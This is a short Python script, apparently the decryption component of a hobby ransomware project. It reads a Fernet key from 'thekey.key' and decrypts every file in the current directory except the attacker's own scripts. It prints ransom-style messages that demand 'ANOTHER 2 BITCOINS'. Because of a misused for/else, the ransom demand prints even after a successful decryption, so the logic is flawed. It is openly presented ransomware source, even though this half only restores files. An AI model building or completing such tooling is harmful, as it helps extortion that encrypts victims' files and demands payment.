import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
     if file == "chakri.py" or file == "thekey.key" or file == "dec.py":
            continue
     if os.path.isfile(file):
            files.append(file)
print(files)

with open("thekey.key","rb") as key:
     secretkey = key.read()

for file in files:
     with open(file,"rb") as thefile:
         contents = thefile.read()
     contents_decrypted = Fernet(secretkey).decrypt(contents)
     with open(file,"wb") as thefile:
         thefile.write(contents_decrypted)
     print("Congrats,your files are decrypted.Enjoy the Rum !!!")
else:
     print("Rum is Gone !!! PROVIDE ANOTHER 2 BITCOINS FOR TRYING ")
